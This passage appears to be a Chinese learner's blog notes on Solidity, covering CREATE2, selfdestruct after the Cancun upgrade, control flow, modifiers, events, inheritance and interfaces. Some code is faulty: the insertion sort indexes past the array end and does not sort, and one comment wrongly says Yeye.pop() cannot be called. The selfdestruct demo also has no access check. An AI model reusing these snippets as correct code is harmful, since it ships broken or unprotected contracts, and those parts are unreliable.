pairAddr)&#123;<br>        require(tokenA != tokenB, &quot;IDENTICAL_ADDRESSES&quot;); //避免tokenA和tokenB相同产生的冲突<br><br>        (address token0,address token1)=tokenA&lt;tokenB?(tokenA,tokenB) : (tokenB,tokenA); //将tokenA和tokenB按大小排序<br><br>        bytes32 salt=keccak256(abi.encodePacked(token0,token1));// 盐值等于两个币哈希<br>        Pair pair = new Pair&#123;salt: salt&#125;();<br>        pair.initialize(tokenA, tokenB);<br>        // 更新map<br>        pairAddr = address(pair);<br>        allPairs.push(pairAddr);<br>        getPair[tokenA][tokenB]=pairAddr;<br>        getPair[tokenB][tokenA]=pairAddr;<br><br>    &#125;<br>    // 提前计算合约地址的方法<br>    function calculateAddr(address tokenA,address tokenB)public view returns (address predictedAddress) &#123;<br>        require(tokenA != tokenB, &quot;IDENTICAL_ADDRESSES&quot;); //避免tokenA和tokenB相同产生的冲突<br><br>        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);  //将tokenA和tokenB按大小排序<br><br>        bytes32 salt = keccak256(abi.encodePacked(token0, token1));// 盐值等于两个币哈希<br>        // 计算合约地址方法 hash()<br>        predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(<br>            bytes1(0xff),<br>            address(this),<br>            salt,<br>            keccak256(type(Pair).creationCode)<br>        )))));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="create2的实际应用场景"><a href="#create2的实际应用场景" class="headerlink" title="create2的实际应用场景"></a>create2的实际应用场景</h2><ol><li>交易所为新用户预留创建钱包合约地址。</li><li>由 <code>CREATE2</code> 驱动的 <code>factory</code> 合约，在<code>Uniswap V2</code>中交易对的创建是在 <code>Factory</code>中调用<code>CREATE2</code>完成。这样做的好处是: 它可以得到一个确定的<code>pair</code>地址, 使得 <code>Router</code>中就可以通过 <code>(tokenA, tokenB)</code> 计算出<code>pair</code>地址, 不再需要执行一次 <code>Factory.getPair(tokenA, tokenB)</code> 的跨合约调用。</li></ol><h1 id="26-删除合约"><a href="#26-删除合约" class="headerlink" title="26. 删除合约"></a>26. 删除合约</h1><p>在 Solidity 中，删除合约的关键字是 <code>selfdestruct</code>（Solidity 0.5 之前叫 <code>suicide</code>，现在统一用 <code>selfdestruct</code>）。</p><hr><h3 id="1-selfdestruct-的作用"><a href="#1-selfdestruct-的作用" class="headerlink" title="1. selfdestruct 的作用"></a>1. <code>selfdestruct</code> 的作用</h3><ul><li>销毁当前合约的所有代码和存储，释放合约占用的区块链存储空间。</li><li>将合约账户中的剩余以太币发送到指定地址。</li><li>一旦合约被销毁，合约地址上不再有代码，调用该地址的合约函数会失败。</li></ul><h3 id="如何使用selfdestruct"><a href="#如何使用selfdestruct" class="headerlink" title="如何使用selfdestruct"></a>如何使用<code>selfdestruct</code></h3><p><code>selfdestruct</code>使用起来非常简单：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">selfdestruct</span>(_addr);<br></code></pre></td></tr></table></figure><p>其中<code>_addr</code>是接收合约中剩余<code>ETH</code>的地址。<code>_addr</code> 地址不需要有<code>receive()</code>或<code>fallback()</code>也能接收<code>ETH</code>。</p><h3 id="Demo-转移ETH功能"><a href="#Demo-转移ETH功能" class="headerlink" title="Demo-转移ETH功能"></a>Demo-转移ETH功能</h3><p>以下合约在坎昆升级前可以完成合约的自毁，在坎昆升级后仅能实现内部ETH余额的转移。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract DeleteContract &#123;<br><br>    uint public value = 10;<br><br>    constructor() payable &#123;&#125;<br><br>    receive() external payable &#123;&#125;<br><br>    function deleteContract() external &#123;<br>        // 调用selfdestruct销毁合约，并把剩余的ETH转给msg.sender<br>        selfdestruct(payable(msg.sender));<br>    &#125;<br><br>    function getBalance() external view returns(uint balance)&#123;<br>        balance = address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>DeleteContract</code>合约中，我们写了一个<code>public</code>状态变量<code>value</code>，两个函数：<code>getBalance()</code>用于获取合约<code>ETH</code>余额，<code>deleteContract()</code>用于自毁合约，并把<code>ETH</code>转入给发起人。</p><p>部署好合约后，我们向<code>DeleteContract</code>合约转入1 <code>ETH</code>。这时，<code>getBalance()</code>会返回1 <code>ETH</code>，<code>value</code>变量是10。</p><p>当我们调用<code>deleteContract()</code>函数，合约将触发<code>selfdestruct</code>操作。<strong>在坎昆升级前，合约会被自毁。但是在升级后，合约依然存在，只是将合约包含的ETH转移到指定地址，而合约依然能够调用。</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>08-2Solidity笔记之二控制流</title>
    <link href="/2025/04/28/08-2Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C/"/>
    <url>/2025/04/28/08-2Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="10-控制流，用Solidity实现插入排序"><a href="#10-控制流，用Solidity实现插入排序" class="headerlink" title="10. 控制流，用Solidity实现插入排序"></a>10. 控制流，用Solidity实现插入排序</h1><h2 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h2><p><code>solidity</code>的几种控制流</p><ol><li>if-else</li><li>for循环</li><li>while循环</li><li>do-while循环</li><li>三元运算符</li><li>插入排序</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 1 if-else<br> function ifElseTest(uint256 _number)public pure returns (bool) &#123;<br>     if(_number==0)&#123;<br>         return (true);<br>     &#125;else &#123;<br>         return (false);<br>     &#125;<br> &#125;<br> //2 for 循环<br> function forLoopTest()public pure  returns (uint256)&#123;<br>     uint sum =0;<br>     for(uint i=0;i&lt;10;i++)&#123;<br>         sum+=i;<br>     &#125;<br>     return (sum);<br> &#125;<br> function forLoopTest2()public pure returns(uint256)&#123;<br>     uint sum=0;// 循环初始<br>     for(uint i=0;i&lt;10;i++)&#123;<br>         sum+=i;<br>     &#125;<br>     return(sum);<br> &#125;<br> //3 while 循环<br> function whileTest()public pure returns(uint256)&#123;<br>     uint sum =0;// 初始变量<br>     uint i=1;<br>     while(i&lt;10)&#123;<br>         sum+=i;<br>         i++;<br>     &#125;<br>     return(sum);<br> &#125;<br> //4 do-while循环<br> function doWhileTest()public pure  returns(uint256)&#123;<br>     uint sum=0;<br>     uint i =1;<br>     do&#123;<br>         sum+=i;<br>         i++;<br>     &#125;while(<br>         i&lt;10<br>     );<br>     return(sum);<br> &#125;<br> //5 三元运算符，这个py也有，可能会碰到比较多<br> function ternaryTest(uint256 x ,uint256 y )public pure  returns(uint256)&#123;<br><br>     return x&gt;=y?x:y;//这里猜测是返回x或者y，如果x&gt;=y就返回x，否者就返回y，冒号后面是否者，前面是默认<br>     // 问号前面是布尔表达式，做判断的<br>     // 冒号前面是期望返回的，就是布尔表达式是ture就返回冒号前面的<br>     // 布尔表达式是否就返回冒号后面的<br> &#125;<br> // 还有continue 和 break <br> //6 写一个插入排序<br> function InsertionSortTest(uint[] memory arr)public pure  returns(uint[] memory)&#123;<br>     for(uint i=1;i&lt;arr.length;i++)&#123;<br>         uint key=arr[i];<br>         uint j=i; <br>         while((j&gt;=1)&amp;&amp;(key&lt;arr[j-1]))&#123;<br>             arr[j+1]=arr[j];<br>             j--;<br>         &#125;<br>         arr[j]=key;<br>     &#125;<br>     return(arr);<br> &#125;<br></code></pre></td></tr></table></figure><h1 id="11-构造函数和修饰器"><a href="#11-构造函数和修饰器" class="headerlink" title="11. 构造函数和修饰器"></a>11. 构造函数和修饰器</h1><h2 id="11-1构造函数"><a href="#11-1构造函数" class="headerlink" title="11.1构造函数"></a>11.1构造函数</h2><p>构造函数每个合约只可以定义一个，在部署合约的时候运行一次，自动运行的，且是第一个运行的，</p><p>构造函数一般用来初始化变量用，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">address owner;<br>// 1、构造函数 一来就会运行这个方法的,你在部署合约的时候就要传入参数才能部署<br>constructor(address initialOwner) &#123;<br>    owner = initialOwner;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11-2-modifier-装饰器，学过py的比较好理解"><a href="#11-2-modifier-装饰器，学过py的比较好理解" class="headerlink" title="11.2 modifier 装饰器，学过py的比较好理解"></a>11.2 modifier 装饰器，学过py的比较好理解</h2><p>就是对函数进行增强用的，在执行函数之前或者之后 运行，也可以改变其运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//2、modifier 装饰器，学过py的比较好理解<br>// 定义一个modifier<br>modifier onlyOwner&#123;<br>    require(msg.sender==owner);// 在判断如果等于就走，如果不等于就会报错的<br>    _; // 加这一行是表示继续执行被装饰的函数<br>&#125;<br>// 定义好了，开始使用<br>function changeOwner(address _newOwner)external onlyOwner&#123;<br>    owner=_newOwner;<br>    // 调用这个方法的时候如果和owner地址不一致就会报错<br>    //transact to Owner2.changeOwner errored: Error encoding arguments: Error: invalid address (argument=&quot;address&quot;, value=&quot;0xa6f9dae10000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4&quot;, code=INVALID_ARGUMENT, version=address/5.7.0) (argument=null, value=&quot;0xa6f9dae10000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4&quot;, code=INVALID_ARGUMENT, version=abi/5.7.0)<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="12-事件-event"><a href="#12-事件-event" class="headerlink" title="12. 事件 event"></a>12. 事件 event</h1><p>事件是干嘛用的？事件<code>event</code>是<code>EVM</code>上日志的抽象，它具备两个特点</p><ul><li>响应：程序可以通过RPC接口订阅和监听这些事件，并在前端做响应—暂时还不知道</li><li>经济：是evm上比较经济的存储数据的方式，每个大概消耗<code>2,000 </code>gas；相比之下，链上存储一个新变量（状态）变量至少需要<code>20,000</code>gas</li></ul><h2 id="声明事件"><a href="#声明事件" class="headerlink" title="声明事件"></a>声明事件</h2><p>声明时以<code>event</code>开头括号里面写好时间需要记录的变量类型和变量名字，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">event Transfer(address indexed from,address indexed to,uint256 value);//这个就是ERC20合约的转账事件<br></code></pre></td></tr></table></figure><p>   可以看到，Transfer事件共记录了3个变量from，to和value，分别对应代币的转账地址，接收地址和转账数量，其中from和to前面带有indexed关键字，他们会保存在以太坊虚拟机日志的topics中，方便之后检索。</p><h2 id="释放事件"><a href="#释放事件" class="headerlink" title="释放事件"></a>释放事件</h2><p>我们可以在函数里释放事件。在下面的例子中，每次用<code>_transfer()</code>函数进行转账操作的时候，都会释放<code>Transfer</code>事件，并记录相应的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 2、释放事件<br>function _transfer(<br>    address from,<br>    address to,<br>    uint256 amount<br>)external &#123;<br>    // _balances[from]=10000000; //给转账地址转一些初始化代币<br>    // _balances[from]-=amount; //给转账地址减掉转账数量<br>    // _balances[to]+=amount;// 给接收地址加上对应的金额<br><br>    // // 释放事件<br>    // emit Transfer(from, to, amount);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="EVM日志-Log—-后面再回来学习"><a href="#EVM日志-Log—-后面再回来学习" class="headerlink" title="EVM日志 Log—-后面再回来学习"></a>EVM日志 <code>Log</code>—-后面再回来学习</h2><p>以太坊虚拟机（EVM）用日志<code>Log</code>来存储<code>Solidity</code>事件，每条日志记录都包含主题<code>topics</code>和数据<code>data</code>两部分。</p><h3 id="主题-topics"><a href="#主题-topics" class="headerlink" title="主题 topics"></a>主题 <code>topics</code></h3><p>日志的第一部分是主题数组，用于描述事件，长度不能超过<code>4</code>。它的第一个元素是事件的签名（哈希）。对于上面的<code>Transfer</code>事件，它的事件哈希就是：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">keccak256</span><span class="hljs-params">(<span class="hljs-string">&quot;Transfer(address,address,uint256)&quot;</span>)</span></span><br><br><span class="hljs-comment">//0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</span><br></code></pre></td></tr></table></figure><p>除了事件哈希，主题还可以包含至多<code>3</code>个<code>indexed</code>参数，也就是<code>Transfer</code>事件中的<code>from</code>和<code>to</code>。</p><p><code>indexed</code>标记的参数可以理解为检索事件的索引“键”，方便之后搜索。每个 <code>indexed</code> 参数的大小为固定的256比特，如果参数太大了（比如字符串），就会自动计算哈希存储在主题中。</p><p>这里其实会引入一个新的问题，根据Solidity的<a href="https://docs.soliditylang.org/en/v0.8.27/abi-spec.html#encoding-of-indexed-event-parameters">官方文档</a>, 对于非值类型的参数（如arrays, bytes, strings）, Solidity不会直接存储，而是会将<code>Keccak-256</code>哈希存储在主题中，从而导致数据信息的丢失。这对于某些依赖于链上事件的DAPP（跨链，用户注册等等）来说，可能会导致事件检索困难，需要解析哈希值。</p><h3 id="数据-data"><a href="#数据-data" class="headerlink" title="数据 data"></a>数据 <code>data</code></h3><p>事件中不带 <code>indexed</code>的参数会被存储在 <code>data</code> 部分中，可以理解为事件的“值”。<code>data</code> 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 <code>data</code> 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 <code>topics</code> 部分中，也是以哈希的方式存储。另外，<code>data</code> 部分的变量在存储上消耗的gas相比于 <code>topics</code> 更少。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;logIndex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;blockNumber&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x16&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;blockHash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x5d06b9024fa1761bfaef0357ddebbea116c548a4cdb15c00a433095b8a177092&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;transactionHash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x1d0698d8ced934ec7d2d14acfe527f8986e8a8a84a5383c629f946ec6410c97c&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;transactionIndex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x5e17b14ADd6c386305A32928F985b29bbA34Eff5&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000e68656c6c6f204261626120686970000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;topics&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab&quot;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">// data是十六进制的，需要转utf8才能读，</span><br></code></pre></td></tr></table></figure><h1 id="13-继承"><a href="#13-继承" class="headerlink" title="13. 继承"></a>13. 继承</h1><p>面向对象编程，绕不过继承，solidity有3种</p><p>我们可以把一个合约看成是py的一个类，a合约继承b合约</p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><ul><li><code>virtual</code>: 父合约中的函数，如果希望子合约重写，需要加上<code>virtual</code>关键字。</li><li><code>override</code>：子合约重写了父合约中的函数，需要加上<code>override</code>关键字。</li></ul><p><strong>注意</strong>：用<code>override</code>修饰<code>public</code>变量，会重写与变量同名的<code>getter</code>函数，例如：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">mapping(address =&gt; <span class="hljs-built_in">uint</span>256) <span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> balanceOf;<br></code></pre></td></tr></table></figure><h3 id="简单继承"><a href="#简单继承" class="headerlink" title="简单继承"></a>简单继承</h3><p>我们先写一个简单的爷爷合约<code>Yeye</code>，里面包含1个<code>Log</code>事件和3个<code>function</code>: <code>hip()</code>, <code>pop()</code>, <code>yeye()</code>，输出都是”Yeye”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Yeye &#123;<br>    event Log(string msg);<br><br>    // 定义3个function: hip(), pop(), yeye()，Log值为Yeye。<br>    function hip() public virtual&#123;<br>        emit Log(&quot;Yeye&quot;);<br>    &#125;<br><br>    function pop() public virtual&#123;<br>        emit Log(&quot;Yeye&quot;);<br>    &#125;<br><br>    function yeye() public virtual &#123;<br>        emit Log(&quot;Yeye&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们再定义一个爸爸合约<code>Baba</code>，让他继承<code>Yeye</code>合约，语法就是<code>contract Baba is Yeye</code>，非常直观。在<code>Baba</code>合约里，我们重写一下<code>hip()</code>和<code>pop()</code>这两个函数，加上<code>override</code>关键字，并将他们的输出改为<code>”Baba”</code>；并且加一个新的函数<code>baba</code>，输出也是<code>”Baba”</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Baba is Yeye&#123;<br>    // 继承两个function: hip()和pop()，输出改为Baba。<br>    function hip() public virtual override&#123;<br>        emit Log(&quot;Baba&quot;);<br>    &#125;<br><br>    function pop() public virtual override&#123;<br>        emit Log(&quot;Baba&quot;);<br>    &#125;<br><br>    function baba() public virtual&#123;<br>        emit Log(&quot;Baba&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们部署合约，可以看到<code>Baba</code>合约里有4个函数，其中<code>hip()</code>和<code>pop()</code>的输出被成功改写成<code>”Baba”</code>，而继承来的<code>yeye()</code>的输出仍然是<code>”Yeye”</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Erzi is Yeye, Baba&#123;<br>    // 继承两个function: hip()和pop()，输出改为Erzi。<br>    function hip() public virtual override(Yeye, Baba)&#123;<br>        emit Log(&quot;hello Erzi&quot;);<br>    &#125;<br>    // 所以virtual表示的是可以被重写<br>    // override 表示的是我这个方法是已经被重写过的<br><br>    // 父合约中某个函数标记为 virtual，表示这个函数允许被子合约重写（override），但子合约不一定必须重写它，除非有特殊情况（比如接口或抽象合约要求实现）。<br>    // 子合约如果要重写父合约的 virtual 函数，必须显式使用 override 关键字，告诉编译器这是重写。<br>    // 如果父合约中某个函数已经使用了 override（说明它本身是重写了更上级父合约的函数），那么子合约只有在需要改变该函数行为时才必须重写它，否则可以直接继承父合约的实现。<br>    function pop() public virtual override(Yeye, Baba) &#123;<br>        emit Log(&quot;hello Erzi&quot;);<br>    &#125;<br><br>    function callParent() public&#123;<br>        Yeye.pop(); //掉用父合约方法不能用 Yeye.pop() 直接调用，因为 Yeye 是合约类型，不是实例。<br>        // Yeye是类不是实力化对象<br>    &#125;<br><br>    function callParentSuper() public&#123;<br>        super.pop(); // 调用父合约方法<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="调用父合约的函数"><a href="#调用父合约的函数" class="headerlink" title="调用父合约的函数"></a>调用父合约的函数</h3><p>子合约有两种方式调用父合约的函数，直接调用和利用<code>super</code>关键字。</p><ol><li><p>直接调用：子合约可以直接用<code>父合约名.函数名()</code>的方式来调用父合约函数，例如<code>Yeye.pop()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function callParent() public&#123;<br>    Yeye.pop();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>super</code>关键字：子合约可以利用<code>super.函数名()</code>来调用最近的父合约函数。<code>Solidity</code>继承关系按声明时从右到左的顺序是：<code>contract Erzi is Yeye, Baba</code>，那么<code>Baba</code>是最近的父合约，<code>super.pop()</code>将调用<code>Baba.pop()</code>而不是<code>Yeye.pop()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function callParentSuper() public&#123;<br>    // 将调用最近的父合约函数，Baba.pop()<br>    super.pop();<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="钻石继承"><a href="#钻石继承" class="headerlink" title="钻石继承"></a>钻石继承</h3><p>….类似python中的多继承里面的经典类（Classic Classes）和新式类（New Style Classes）的区分</p><p>就是继承顺序的概念</p><h1 id="14-抽象合约和接口"><a href="#14-抽象合约和接口" class="headerlink" title="14. 抽象合约和接口"></a>14. 抽象合约和接口</h1><h2 id="抽象合约"><a href="#抽象合约" class="headerlink" title="抽象合约"></a>抽象合约</h2><p>如果某个智能合约里面至少有一个未实现的函数，则这个合约就是抽象合约，用<code>abstract</code>标识，另外这个未实现的函数需要加<code>virtual</code>标识以便子合约重写该函数，</p><p>当我们还没有想好这个函数怎么写的时候可以使用抽象合约</p><p>当我们需要子合约都有这个函数且都重写是可以使用抽象合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">abstract contract InsertionSort &#123;<br>    //TypeError: Contract &quot;InsertionSort&quot; should be marked as abstract.<br>    //类型错误：合同“InsertionSort”应标记为抽象<br>    // 没有函数体&#123;&#125;的<br>    function insertionSort(uint[] memory a)public pure virtual returns(uint[] memory); <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>接口就类似于抽象合约，但他不实现任何功能，接口的规则</p><ol><li>只能<strong>声明</strong>函数，不能定义函数体，也就是说接口中的函数都是抽象的，没有实现代码</li><li>所有函数默认都是<code>external</code>和<code>virtual</code>,external不需要显式写，接口函数默认都是可外部调用</li><li>不能定义构造函数、状态变量、修饰符、枚举等–接口只声明函数，只声明</li><li>接口不能继承普通合约，但可以继承其他接口，&#x3D;&#x3D;&#x3D;接口之间允许继承，实现接口的组合，</li><li>继承接口的非抽象合约必须实现接口定义的所有功能</li></ol><blockquote><p>为什么要用Interface接口？</p><p>1、规范合约的行为，我声明一组必须实现的函数，来确保合约实现统一的功能，比如说我声明（吃饭、睡觉、玩耍三个函数）那如果其他合约（狗、猫）继承我这个接口，就必须要实现这三个函数，所以说是一种约束</p><p>2、方便合约之间的交互，通过接口调用其他合约，减少耦合，就是我调用的是，只关心函数签名–就是函数的入参和返回的结果，不关心具体实现&#x3D;&#x3D;&#x3D;&#x3D;比如说微信也有支付方法、支付宝也有支付方法，我只关心我传未支付订单给支付方法，支付方法告诉我支付结果即可，我不关注其内部是怎么实现的</p><p>3、支持多合约协作和模块化开发—–不同合约实现相同接口，可以互换使用</p></blockquote><p>接口虽然不实现任何功能，但它hi智能合约的骨架，如果智能合约实现了某种接口（比如说<code>ERC20</code>或者<code>ERC721</code>）,那其他Dapp和智能合约就知道如何与他交互</p><p>另外，接口与合约<code>ABI</code>（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的<code>ABI</code>，利用<a href="https://gnidan.github.io/abi-to-sol/">abi-to-sol工具</a>，也可以将<code>ABI json</code>文件转换为<code>接口sol</code>文件。</p><p>我们以<code>ERC721</code>接口合约<code>IERC721</code>为例，它定义了3个<code>event</code>和9个<code>function</code>，所有<code>ERC721</code>标准的NFT都实现了这些函数。我们可以看到，接口和常规合约的区别在于每个函数都以<code>;</code>代替函数体<code>&#123; &#125;</code>结尾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &quot;@openzeppelin/contracts/utils/introspection/IERC165.sol&quot;;<br><br>interface IERC721 is IERC165 &#123;<br>    event Transfer(address indexed from, address indexed to, 